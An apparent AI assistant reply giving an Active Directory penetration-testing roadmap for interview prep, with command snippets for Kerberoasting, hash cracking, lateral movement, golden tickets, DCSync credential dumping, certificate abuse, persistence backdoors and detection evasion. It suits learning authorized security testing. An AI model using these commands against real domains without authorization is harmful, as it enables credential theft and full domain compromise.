Great 👍

Since you said **ok**, here is the **next-level AD Pentesting Interview Roadmap / Cheat Sheet** (Beginner → Expert). This is very useful for interviews and real-world flow.

---

# ✅ Active Directory Pentesting Roadmap (Beginner → Expert)

---

## **1. Initial Enumeration (Beginner)**

### Goal: Understand the Domain

**Commands / Tools**

* `whoami`
* `ipconfig /all`
* `net user /domain`
* `net group "Domain Admins" /domain`

**LDAP Enumeration**

* PowerView:

```powershell
Get-NetDomain
Get-NetUser
Get-NetGroup
```

---

## **2. Network & SMB Enumeration**

### Goal: Find reachable hosts + shares

Tools:

* Nmap
* CrackMapExec

Examples:

```bash
nmap -p 445 --open 10.0.0.0/24
cme smb 10.0.0.0/24
```

Check shares:

```bash
smbclient -L //target
```

---

## **3. Credential Access Techniques (Intermediate)**

### Password Attacks

* AS-REP Roasting
* Kerberoasting

**AS-REP Roast**

```bash
GetNPUsers.py domain/ -no-pass
```

**Kerberoast**

```bash
GetUserSPNs.py domain/user:pass -request
```

Crack hashes:

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

---

## **4. Lateral Movement (Intermediate)**

### Goal: Move inside the domain

Methods:

* PsExec
* WMI
* WinRM

Tools:

* Impacket
* CME

Example:

```bash
psexec.py domain/user@target
wmiexec.py domain/user@target
```

---

## **5. Privilege Escalation in AD (Advanced)**

### ACL Abuse

Use BloodHound to find:

* GenericAll
* WriteDACL
* ForceChangePassword

Example attack:

* Reset DA password if you have rights

---

## **6. Kerberos Attacks (Advanced)**

### Pass-the-Ticket

```bash
Rubeus ptt /ticket:da.kirbi
```

### Golden Ticket

* Requires KRBTGT hash

```bash
mimikatz kerberos::golden
```

---

## **7. Domain Replication Attacks (Expert)**

### DCSync

```bash
secretsdump.py domain/user@dc --just-dc
```

### DCShadow

* Push malicious changes like a rogue DC

Harder to detect.

---

## **8. AD CS Attacks (Expert)**

### Certificate Escalation (ESC1–ESC8)

Tool: Certipy

```bash
certipy find -u user -p pass -target dc
certipy req -template VulnerableTemplate
```

Authenticate as DA using cert.

---

## **9. Delegation Abuse (Expert)**

### Unconstrained Delegation

* Dump DA tickets from memory

### RBCD Attack

* Abuse `msDS-AllowedToActOnBehalfOfOtherIdentity`

---

## **10. Persistence + Cleanup (Expert)**

Persistence:

* Golden Ticket
* AdminSDHolder backdoor
* GPO persistence
* Shadow Credentials

Defense Evasion:

* Minimal ticket lifetime
* Avoid noisy scans
* Targeted DCSync only

---

# ✅ Must-Know Tools for Interviews

| Purpose   | Tools                 |
| --------- | --------------------- |
| Enum      | PowerView, BloodHound |
| Exploit   | Impacket, Rubeus      |
| Cred Dump | Mimikatz              |
| ADCS      | Certipy               |
| SMB       | CrackMapExec          |
| Reporting | PlexTrac, Dradis      |

---

# 🔥 Interview Tip (Golden Line)

> “I always follow the AD kill chain: Enumeration → Credential Access → Lateral Movement → Privilege Escalation → Domain Compromise → Persistence.”

---

If you want, next I can provide:

✅ **Top 30 AD Pentesting Interview Questions (Company-Level)**
✅ **Real HackTheBox AD attack walkthrough style**
✅ **Cheat sheet PDF for AD Pentesting**

Just tell me what you want.
